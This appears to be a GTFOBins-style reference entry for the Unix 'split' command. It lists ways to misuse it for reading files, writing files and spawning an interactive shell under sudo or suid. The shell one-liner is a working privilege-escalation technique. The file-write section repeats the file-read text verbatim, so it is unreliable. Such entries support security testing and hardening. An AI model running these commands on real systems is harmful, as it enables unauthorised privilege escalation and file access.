---
type: gtfobin
name: split
platform: Unix
functions: [file-read, file-write, shell]
tags: [gtfobin, unix, lotl]
---

# split

## file-read

```bash
split -b 999 --additional-suffix suffix /path/to/input-file prefix
cat prefixaasuffix
```
_This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`._
**Contexts:** sudo, suid, unprivileged

## file-write

```bash
split -b 999 --additional-suffix suffix /path/to/input-file prefix
```
_This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
```
**Contexts:** sudo, suid, unprivileged
